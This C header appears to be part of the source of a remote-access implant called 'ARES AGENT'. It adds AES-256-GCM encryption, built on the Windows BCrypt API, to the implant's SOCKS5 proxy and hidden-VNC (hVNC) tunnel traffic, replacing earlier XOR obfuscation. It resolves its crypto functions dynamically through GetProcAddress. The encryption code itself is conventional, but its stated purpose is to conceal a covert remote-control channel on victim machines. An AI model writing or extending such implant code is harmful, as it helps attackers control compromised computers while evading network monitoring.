/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — AES-256-GCM Tunnel Encryption (v5.0)
 *
 *  Replaces XOR obfuscation with authenticated encryption for
 *  SOCKS5 and hVNC tunnel traffic.
 *
 *  Uses Windows BCrypt API (no external deps):
 *    - BCRYPT_AES_ALGORITHM + BCRYPT_CHAIN_MODE_GCM
 *    - 12-byte counter nonce (incrementing)
 *    - 16-byte auth tag per frame
 *
 *  Thread-safe: uses CRITICAL_SECTION for nonce counter.
 * ═══════════════════════════════════════════════════════════════
 */

#ifndef ARES_TUNNEL_CRYPTO_H
#define ARES_TUNNEL_CRYPTO_H

#include <windows.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

/* ── Tunnel Crypto Context ── */
typedef struct _TUNNEL_CRYPTO {
    BCRYPT_ALG_HANDLE   hAlg;
    BCRYPT_KEY_HANDLE   hKey;
    BYTE                key[32];        /* AES-256 key */
    volatile LONGLONG   nonce_counter;  /* 8-byte incrementing counter */
    BYTE                nonce_prefix[4];/* 4-byte random prefix */
    BOOL                initialized;
    CRITICAL_SECTION    cs;
} TUNNEL_CRYPTO;

/* Global crypto contexts for SOCKS5 and hVNC */
static TUNNEL_CRYPTO g_socks5_crypto = {0};
static TUNNEL_CRYPTO g_hvnc_crypto   = {0};

/* ── Initialize crypto context with 32-byte key ── */
static BOOL tunnel_crypto_init(TUNNEL_CRYPTO* ctx, const BYTE* key_bytes)
{
    if (ctx->initialized) return TRUE;

    InitializeCriticalSection(&ctx->cs);
    memcpy(ctx->key, key_bytes, 32);
    ctx->nonce_counter = 0;

    /* Generate random 4-byte nonce prefix */
    HMODULE hBcrypt = LoadLibraryA("bcrypt.dll");
    if (!hBcrypt) return FALSE;

    typedef NTSTATUS (WINAPI *pBCryptGenRandom_t)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
    pBCryptGenRandom_t pGenRandom = (pBCryptGenRandom_t)GetProcAddress(hBcrypt, "BCryptGenRandom");
    if (pGenRandom)
        pGenRandom(NULL, ctx->nonce_prefix, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    /* Open AES algorithm */
    typedef NTSTATUS (WINAPI *pBCryptOpenAlgorithmProvider_t)(
        BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
    pBCryptOpenAlgorithmProvider_t pOpen =
        (pBCryptOpenAlgorithmProvider_t)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    if (!pOpen) return FALSE;

    NTSTATUS st = pOpen(&ctx->hAlg, L"AES", NULL, 0);
    if (st != 0) return FALSE;

    /* Set GCM mode */
    typedef NTSTATUS (WINAPI *pBCryptSetProperty_t)(
        BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
    pBCryptSetProperty_t pSetProp =
        (pBCryptSetProperty_t)GetProcAddress(hBcrypt, "BCryptSetProperty");
    if (pSetProp) {
        pSetProp(ctx->hAlg, L"ChainingMode",
            (PUCHAR)L"ChainingModeGCM",
            (ULONG)(wcslen(L"ChainingModeGCM") + 1) * sizeof(WCHAR), 0);
    }

    /* Generate symmetric key object */
    typedef NTSTATUS (WINAPI *pBCryptGenerateSymmetricKey_t)(
        BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    pBCryptGenerateSymmetricKey_t pGenKey =
        (pBCryptGenerateSymmetricKey_t)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    if (!pGenKey) return FALSE;

    st = pGenKey(ctx->hAlg, &ctx->hKey, NULL, 0, ctx->key, 32, 0);
    if (st != 0) return FALSE;

    ctx->initialized = TRUE;
    return TRUE;
}

/* ── Build 12-byte nonce: [4-byte prefix][8-byte counter] ── */
static void tunnel_crypto_nonce(TUNNEL_CRYPTO* ctx, BYTE nonce_out[12])
{
    memcpy(nonce_out, ctx->nonce_prefix, 4);
    LONGLONG counter = InterlockedIncrement64(&ctx->nonce_counter);
    memcpy(nonce_out + 4, &counter, 8);
}

/* ── Encrypt frame: returns allocated buffer with [4-byte len][12-byte nonce][ciphertext][16-byte tag] ──
 * Caller must HeapFree the returned buffer.
 * Returns NULL on failure. out_total_len = total bytes to send. */
static BYTE* tunnel_encrypt_frame(TUNNEL_CRYPTO* ctx,
    const BYTE* plaintext, int plain_len, int* out_total_len)
{
    if (!ctx->initialized || plain_len <= 0) return NULL;

    HMODULE hBcrypt = GetModuleHandleA("bcrypt.dll");
    if (!hBcrypt) return NULL;

    typedef NTSTATUS (WINAPI *pBCryptEncrypt_t)(
        BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG,
        PUCHAR, ULONG, ULONG*, ULONG);
    pBCryptEncrypt_t pEncrypt =
        (pBCryptEncrypt_t)GetProcAddress(hBcrypt, "BCryptEncrypt");
    if (!pEncrypt) return NULL;

    /* Build nonce */
    BYTE nonce[12];
    EnterCriticalSection(&ctx->cs);
    tunnel_crypto_nonce(ctx, nonce);
    LeaveCriticalSection(&ctx->cs);

    /* Total output: [4-byte len][12-byte nonce][ciphertext (same as plaintext len)][16-byte tag] */
    int ct_len = plain_len;
    int tag_len = 16;
    int wire_len = 4 + 12 + ct_len + tag_len;

    BYTE* output = (BYTE*)HeapAlloc(GetProcessHeap(), 0, wire_len);
    if (!output) return NULL;

    /* Prepare GCM auth info */
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = output + 4 + 12 + ct_len; /* tag at end */
    authInfo.cbTag = tag_len;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;

    ULONG result_len = 0;
    NTSTATUS st = pEncrypt(ctx->hKey,
        (PUCHAR)plaintext, plain_len, &authInfo,
        NULL, 0,
        output + 4 + 12, ct_len, &result_len, 0);

    if (st != 0) {
        HeapFree(GetProcessHeap(), 0, output);
        return NULL;
    }

    /* Write length prefix (BE) */
    int payload_len = 12 + ct_len + tag_len; /* everything after length prefix */
    output[0] = (BYTE)(payload_len >> 24);
    output[1] = (BYTE)(payload_len >> 16);
    output[2] = (BYTE)(payload_len >> 8);
    output[3] = (BYTE)(payload_len);

    /* Write nonce */
    memcpy(output + 4, nonce, 12);

    *out_total_len = wire_len;
    return output;
}

/* ── Decrypt frame: input is [12-byte nonce][ciphertext][16-byte tag] ──
 * payload_len = total len (nonce + ct + tag). Decrypted output written to out_buf.
 * Returns plaintext length, or -1 on failure. */
static int tunnel_decrypt_frame(TUNNEL_CRYPTO* ctx,
    const BYTE* encrypted, int encrypted_len, BYTE* out_buf, int out_max)
{
    if (!ctx->initialized || encrypted_len < 12 + 16 + 1) return -1;

    HMODULE hBcrypt = GetModuleHandleA("bcrypt.dll");
    if (!hBcrypt) return -1;

    typedef NTSTATUS (WINAPI *pBCryptDecrypt_t)(
        BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG,
        PUCHAR, ULONG, ULONG*, ULONG);
    pBCryptDecrypt_t pDecrypt =
        (pBCryptDecrypt_t)GetProcAddress(hBcrypt, "BCryptDecrypt");
    if (!pDecrypt) return -1;

    const BYTE* nonce = encrypted;
    int ct_len = encrypted_len - 12 - 16;
    const BYTE* ciphertext = encrypted + 12;
    const BYTE* tag = encrypted + 12 + ct_len;

    if (ct_len <= 0 || ct_len > out_max) return -1;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;

    ULONG result_len = 0;
    NTSTATUS st = pDecrypt(ctx->hKey,
        (PUCHAR)ciphertext, ct_len, &authInfo,
        NULL, 0,
        out_buf, out_max, &result_len, 0);

    if (st != 0) return -1; /* auth failed = tampered */
    return (int)result_len;
}

/* ── Generate session key: 32 random bytes ── */
static BOOL tunnel_generate_session_key(BYTE key_out[32])
{
    HMODULE hBcrypt = LoadLibraryA("bcrypt.dll");
    if (!hBcrypt) return FALSE;

    typedef NTSTATUS (WINAPI *pBCryptGenRandom_t)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
    pBCryptGenRandom_t pGenRandom =
        (pBCryptGenRandom_t)GetProcAddress(hBcrypt, "BCryptGenRandom");
    if (!pGenRandom) return FALSE;

    return (pGenRandom(NULL, key_out, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0);
}

/* ── Cleanup ── */
static void tunnel_crypto_destroy(TUNNEL_CRYPTO* ctx)
{
    if (!ctx->initialized) return;

    HMODULE hBcrypt = GetModuleHandleA("bcrypt.dll");
    if (hBcrypt) {
        typedef NTSTATUS (WINAPI *pBCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
        typedef NTSTATUS (WINAPI *pBCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);

        pBCryptDestroyKey_t pDestKey =
            (pBCryptDestroyKey_t)GetProcAddress(hBcrypt, "BCryptDestroyKey");
        pBCryptCloseAlgorithmProvider_t pClose =
            (pBCryptCloseAlgorithmProvider_t)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");

        if (pDestKey && ctx->hKey) pDestKey(ctx->hKey);
        if (pClose && ctx->hAlg) pClose(ctx->hAlg, 0);
    }

    SecureZeroMemory(ctx->key, 32);
    DeleteCriticalSection(&ctx->cs);
    ctx->initialized = FALSE;
}

#endif /* ARES_TUNNEL_CRYPTO_H */
